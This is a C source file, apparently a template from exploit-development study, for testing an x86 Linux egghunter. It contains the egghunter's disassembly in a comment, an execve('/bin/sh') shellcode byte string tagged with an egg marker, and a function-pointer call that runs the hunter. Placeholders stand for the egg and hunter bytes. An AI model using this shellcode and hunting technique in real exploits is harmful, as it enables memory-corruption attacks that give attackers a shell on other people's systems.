/*
Egghunter shellcode tester
-------------------------------
  
Disassembly of section .text:

08048080 <_start>:
 8048080:   66 81 c9 ff 0f          or     cx,0xfff

08048085 <next_addr>:
 8048085:   41                      inc    ecx
 8048086:   6a 43                   push   0x43
 8048088:   58                      pop    eax
 8048089:   cd 80                   int    0x80
 804808b:   3c f2                   cmp    al,0xf2
 804808d:   74 f1                   je     8048080 <_start>
 804808f:   b8 42 55 47 47          mov    eax,0x47475542
 8048094:   40                      inc    eax
 8048095:   89 cf                   mov    edi,ecx
 8048097:   af                      scas   eax,DWORD PTR es:[edi]
 8048098:   75 eb                   jne    8048085 <next_addr>
 804809a:   ff e7                   jmp    edi

 
*/

#include <stdio.h>
#include <string.h>

#define     EGG     "<EGG>"

unsigned char sled[] = "Some misc bytes here";
unsigned char egghunter[] = 
        "<EGGHUNTER>";
unsigned char garbage[] = "Garbage, mangled bytes, whatever";
// execve(/bin/sh,..) shellcode here 
unsigned char shellcode[] = EGG
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
                "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Function pointer
typedef int (*func_ptr)();

void main() {
    printf("Egghunter length: %d bytes\n", strlen(egghunter));
    printf("Shellcode Length:  %d bytes\n", strlen(shellcode));

    ((func_ptr) egghunter)();
}